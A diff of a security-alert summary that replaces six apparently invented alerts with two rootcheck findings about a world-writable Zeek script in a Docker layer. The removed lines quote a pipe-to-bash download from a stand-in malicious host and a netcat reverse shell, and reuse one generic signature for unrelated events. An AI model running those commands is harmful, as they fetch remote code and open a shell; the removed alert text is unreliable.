@@ -1,47 +1,19 @@
-Event #1:
-Alert ID: 1720683874.36244
-Alert Name: Rootcheck Anomaly Detection Event
-Summary: Trojaned version of file '/usr/bin/diff' detected
-Key Points: Signature used: 'bash|^/bin/sh|file\\.h|proc\\.h|/dev/[^n]|^/bin/.*sh' (Generic)
-Affected User/Device: stack02
-Criticality Level: MEDIUM
+1. Event ID: 1720683876.36633
+   - Alert ID: 1720683876.36633
+   - Alert name: rootcheck
+   - Summary: File is owned by root and has written permissions to anyone.
+   - Key points:
+     - File: /var/lib/docker/overlay2/dbae28b82b6152b8caf412825fdf636a2d99ea200f725f07cadf60055cc2aadb/diff/usr/local/zeek/share/zeek/site/autoload/001-unload-scripts.zeek
+     - Criticality level: Medium (Severity 2)
+   - Affected user/device: None specified
 
-Event #2:
-Alert ID: 1720683874.36245
-Alert Name: Host-based Anomaly Detection Event (Rootcheck)
-Summary: Suspicious modification of file '/etc/passwd' detected
-Key Points: Signature used: 'bash|^/bin/sh|file\\.h|proc\\.h|/dev/[^n]|^/bin/.*sh' (Generic)
-Affected User/Device: stack02
-Criticality Level: HIGH
+2. Event ID: 1720683878000
+   - Alert ID: 1720683878000
+   - Alert name: rootcheck
+   - Summary: File is owned by root and has written permissions to anyone.
+   - Key points:
+     - File: /var/lib/docker/overlay2/dbae28b82b6152b8caf412825fdf636a2d99ea200f725f07cadf60055cc2aadb/diff/usr/local/zeek/share/zeek/site/autoload/001-unload-scripts.zeek
+     - Criticality level: Medium (Severity 2)
+   - Affected user/device: None specified
 
-Event #3:
-Alert ID: 1720683874.36246
-Alert Name: Suspicious Execution of Binary File
-Summary: Unauthorized execution of binary file detected (file: '/usr/bin/ls')
-Key Points: Signature used: 'bash|^/bin/sh|file\\.h|proc\\.h|/dev/[^n]|^/bin/.*sh' (Generic)
-Affected User/Device: stack02
-Criticality Level: HIGH
-
-Event #4:
-Alert ID: 1720683874.36247
-Alert Name: Potential Command Injection Vulnerability
-Summary: Potentially malicious command injection detected (command: 'curl https://malicious-site.com | bash')
-Key Points: Signature used: 'bash|^/bin/sh|file\\.h|proc\\.h|/dev/[^n]|^/bin/.*sh' (Generic)
-Affected User/Device: stack02
-Criticality Level: CRITICAL
-
-Event #5:
-Alert ID: 1720683874.36248
-Alert Name: Unusual Network Traffic Patterns
-Summary: Abnormal outbound network traffic detected from IP address '192.168.125.130'
-Key Points: Destination IPs: ['103.22.217.245', '5.180.139.6']
-Affected User/Device: stack02
-Criticality Level: HIGH
-
-Event #6:
-Alert ID: 1720683874.36249
-Alert Name: Suspicious Process Execution
-Summary: Unauthorized execution of process detected (process: 'nc -e /bin/bash 10.0.0.1 5000')
-Key Points: Signature used: 'bash|^/bin/sh|file\\.h|proc\\.h|/dev/[^n]|^/bin/.*sh' (Generic)
-Affected User/Device: stack02
-Criticality Level: CRITICAL
+Note: Both events are related to files owned by root and having written permissions for anyone, which can be considered a potential security issue. However, additional context is needed to determine if these events are false positives or genuine threats.
